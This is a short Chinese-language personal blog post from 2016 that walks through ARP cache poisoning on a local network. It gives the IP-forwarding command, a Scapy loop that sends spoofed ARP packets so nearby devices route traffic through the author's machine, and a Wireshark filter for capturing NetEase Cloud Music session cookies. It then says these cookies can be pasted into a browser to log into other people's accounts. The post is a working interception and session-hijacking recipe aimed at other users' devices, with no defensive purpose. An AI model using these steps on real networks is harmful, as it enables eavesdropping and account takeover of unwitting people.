---
title: 走进科学之如何正确地抓包——破
date: 2016-04-26 21:25:44
tags:
---
上一篇博客提到窃听流量的方式多种多样。而实际上通过vpn来窃听流量的方式操作起来不是很好玩。

于是经过上网查找，找到了reverland的[博客](http://reverland.org/security/2016/03/08/harvest-mm-pics/)，于是如法炮制的试验了一下。

由于内容继承了上一篇，因此本文的标题就叫“破”好了。

### 原理

通过arp污染，让局域网内的机器认为本机是网关，窃听上传流量

具体一点的原因是这样：数据包在局域网内传输时，会根据本机维护的一个arp表进行传输。

通过查询arp表内局域网ip对应的mac地址发送数据，也就是说只要让目标机器误以为我的机器的mac地址为网关的mac地址就能窃听机器的上传流量，而只要在我机器上做了转发，目标机器就能正常通信

以下的内容和reverland的博客内容一样。。。

### 设置系统转发

切换为root用户之后，在终端中输入

`echo 1 > /proc/sys/net/ipv4/ip_forward`

### arp污染

在进行apr污染之前，可以先查看同一局域网下linux设备或者安卓手机的arp表，使用命令`cat /proc/net/arp`查看。

进入python的交互模式，输入以下命令

```
from scapy.all import *
import time

target = ""//目标机器ip，例如"192.168.1.10"，输入子网"192.168.1.0/24"也行
gateway = ""//网关的ip，例如"192.168.1.1"

while 1:
  send(ARP(op="who-has",pdst=target,psrc=gateway))
  time.sleep(1)
```

很快局域网内的设备arp表就会更新，网关mac地址被更改为本机的mac地址

### 获取cookie

这时打开wireshark，就可以愉快的查看数据包了

输入过滤条件`http.host=="music.163.com" and http.cookie`，然后在手机上打开网易云音乐，就能得到cookie

粘贴到浏览器就能愉快的登陆别人的网易云音乐了。。虽然这并没有什么用。。